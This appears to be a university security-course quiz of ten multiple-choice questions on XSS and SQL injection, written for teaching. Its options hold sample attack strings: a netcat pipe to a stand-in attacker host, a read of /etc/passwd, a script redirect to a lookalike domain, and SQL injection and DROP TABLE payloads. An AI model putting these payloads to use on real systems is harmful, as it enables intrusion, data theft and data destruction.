## Question 1

:rat:Which language is used for Cross Site Scripting?

1. Java
2. Http
3. Php
4. Javascript

## Question 2

:rat:Which attack type is not possible with Cross Site Scripting

1. Overwriting the webpage content on the server side
2. Overwriting the webpage content on the client side
3. Sending attacker controlled requests to the server
4. Stealing sessions of logged in users

## Question 3

:rat:Which of the following looks like an XSS attack?

1. `http://innsida.ntnu.no/blackboard|nc xss.evildomain.com 8080`
2. `http://innsida.ntnu.no/blackboard<script>document.location='http://innsida.ntnuu.no/blackboard'</script>`
3. `http://innsida.ntnu.no/blackboard<?php print('http://innsida.ntnuu.no/blackboard') ?>`
4. `http://innsida.ntnu.no/blackboard|cat /etc/passwd`

## Question 4

:rat:Which of these does not prevent Cross Site Scripting?

1. encode all output coming from input data
2. disable client side scripts
3. filtering for the `<script>` keyword with firewall
4. validate all user input on the server side

## Question 5

:rat:Which SQL statement can be used to retrieve data from the database?

1. select
2. update
3. insert
4. drop

## Question 6

:rat:What is the meaning of * in an SQL query?

1. all columns
2. all rows
3. all tables
4. `*` is not used in SQL

## Question 7

:rat:Which SQL keyword is used to filter the result?

1. Union
2. Where
3. Filter
4. If

## Question 8

:rat:What is manipulated with SQL injection?

1. the browser sandboxing
2. the database query
3. the http protocol
4. the javascript

## Question 9

:rat:What is possible with SQL injection?

1. only overwriting data in the database
2. only login bypass
3. both reading data and overwriting data in the database
4. only reading data from the database

## Question 10

:rat:Which of the following link looks like an SQL injection attack attempt?

1. `http://innsida.ntnu.no/blackboard?teacher=<script>alert('SQL injection')</script>`
2. `http://innsida.ntnu.no/blackboard?teacher=Drop table students;#`
3. `http://innsida.ntnu.no/blackboard?teacher=sqlmap --wizard`
4. `http://innsida.ntnu.no/blackboard?teacher=Laszlo'+OR+5=5--`
